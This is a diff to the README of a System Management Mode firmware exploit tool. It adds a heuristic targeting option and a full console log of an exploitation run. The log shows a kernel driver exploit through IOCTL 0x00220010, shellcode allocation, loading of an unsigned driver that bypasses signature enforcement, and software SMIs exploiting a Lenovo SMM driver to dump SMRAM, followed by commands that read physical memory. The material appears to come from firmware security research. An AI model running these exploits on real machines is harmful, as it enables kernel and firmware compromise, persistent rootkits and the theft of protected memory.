@@ -39,7 +39,7 @@ https://github.com/Cr4sh/secretnet_expl
 
 To run System Management Mode exploit from command line you can use bin/fwexpl_app_amd64.exe program, here's the list of available command line options:
 
-  --target <N> — Select known target where <N> is a target number.
+  --target <N> — Select known target where <N> is a target number. If --target and --target-addr options are not specified — exploit will use heuristics to find EFI_BOOT_SERVICES structure address that neccessary for SystemSmmAhciAspiLegacyRt driver vulnerability exploitation.
   
   --target-list — Print all known targets information.
 
@@ -70,7 +70,60 @@ https://mega.nz/#!ydEnSabK!H63Yw44POR0dO02WAh-f1eqgHaWeeqlqP75_XwIzw_4
 
 Usage examples:
 
-  > fwexpl_app_amd64.exe --target 1 — Test run of SMM exploit without payload;
+C:\> fwexpl_app_amd64.exe --smram-dump --file TSEG.bin --dse-bypass
+NtOpenFile() fails; status: 0xc0000034
+InfLoadDriver(): Exit code = 0
+OpenAndStartService(): Service "sncc0" started
+NT version is 6.2.9200
+nt!ExAllocatePool() is at 0xfffff8034d76f710
+nt!HalDispatchTable is at 0xfffff8034d959780
+Shellcode size is 0x870 bytes
+Shellcode is allocated at 0x0000100804020000
+Address of the ring0 payload handler is 0x00001008040200c9
+Opengin device "\\.\Global\SNCC0_Sys"...
+IRP user buffer address is 0x000000000014f800
+IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
+IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
+IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
+IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
+IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
+IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
+IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
+IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
+IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
+IOCTL 0x00220010: status = 0xc0000005, info = 0x00000000
+expl_SNCC0_Sys_220010(): Exploitation success
+Opening service...
+OK
+Stopping service...
+OK
+Deleting service...
+OK
+kernel_expl_load_driver(): Driver loaded at 0xffffe000d0694000
+Host bridge VID = 0x8086, DID = 0x1604
+SMRAM is at 0xad000000:0xad7fffff
+hal!HalEfiRuntimeServicesTable is at 0xfffff8034d6631b8
+hal!HalEfiRuntimeServicesTable value is 0xfffff8034d663160
+EFI_RUNTIME_SERVICES.GetVariable() is at 0xfffffffffef55c08
+EFI image is at 0xfffffffffef55000 (8640 bytes)
+EFI_BOOT_SERVICES address is 0x00000000a11a6610
+EFI_BOOT_SERVICES.LocateProtocol address is 0xa11a6750
+SMM payload handler address is 0x1149ce8b0 with context at 0x1a477bb8
+Physical memory for shellcode allocated at 0xaa75f000
+Old pointer 0xa11a6750 value is 0x0
+Generating software SMI 0...
+expl_lenovo_SystemSmmAhciAspiLegacyRt(): Exploitation fails
+Generating software SMI 1...
+expl_lenovo_SystemSmmAhciAspiLegacyRt(): Exploitation fails
+Generating software SMI 2...
+expl_lenovo_SystemSmmAhciAspiLegacyRt(): Exploitation fails
+Generating software SMI 3...
+expl_lenovo_SystemSmmAhciAspiLegacyRt(): Exploitation success
+8388608 bytes written to the "TSEG.bin"
+Press any key to quit...
+
+
+Reading and writing memory:
 
   > fwexpl_app_amd64.exe --target 1 --phys-mem-read 0x86000000 --size 0x1000 — Read 4096 bytes of physical memory starting from 0x86000000 and print it's hexadecimal dump to stdout.
 
